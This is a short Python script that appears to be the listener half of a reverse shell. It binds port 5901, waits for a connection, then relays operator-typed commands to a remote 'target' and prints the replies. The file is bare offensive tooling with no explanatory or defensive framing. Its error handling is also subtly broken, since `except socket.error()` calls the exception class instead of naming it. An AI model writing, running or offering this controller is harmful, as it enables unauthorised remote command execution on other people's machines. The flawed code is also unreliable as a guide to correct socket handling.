import socket
import sys


def create_s():
    try:
        global host
        global port
        global s
        host = ''
        port = 5901
        s = socket.socket()
    except socket.error() as e:
        print(f'Socket Error : {e}')


def bind_s():
    # Binding Socket & Listening For Connections
    try:
        global port, host, s
        print(f'Binding Port {port}')
        s.bind((host, port))
        s.listen(5)
    except socket.error() as e:
        print(f'Socket Error : {e}')
        bind_s()


def accept_s():
    # Establish A Connection With A Client
    connection, address = s.accept()
    print(f"Connection Has Been Successfully Established!\nIP - {address[0]}:{address[1]}")
    send_commands(connection)
    connection.close()


def send_commands(connection):
    # Send Commands To The Target In Bytes & Receives Response In Strings
    while 1:
        cmd = input()
        if cmd == 'quit':
            connection.close()
            s.close()
            sys.exit()
        if len(cmd.encode()) > 0:
            connection.send(cmd.encode())
            client_response = str(connection.recv(1024), 'utf-8')
            print(client_response, end='')


create_s()
bind_s()
accept_s()
